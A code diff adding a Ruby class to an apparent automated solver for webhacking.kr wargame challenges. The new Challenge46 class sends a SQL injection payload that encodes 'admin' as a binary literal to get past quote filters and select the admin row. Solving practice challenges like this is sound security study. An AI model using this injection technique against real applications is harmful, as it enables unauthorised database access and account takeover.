@@ -782,6 +782,25 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 46
+  class Challenge46 < ChallengeBase
+    CHALLENGE = 46
+
+    PATH = '/challenge/web-23/'
+    PARAM_LV = 'lv'
+    LOGIN = 'admin'
+    PAYLOAD = '(0)OR`id`=0b$BIN$'
+
+    def exec
+      payload = PAYLOAD.sub('$BIN$', LOGIN.unpack1('B*'))
+      query = URI.encode_www_form(PARAM_LV => payload)
+      log('Sending payload')
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 54
   class Challenge54 < ChallengeBase
     CHALLENGE = 54
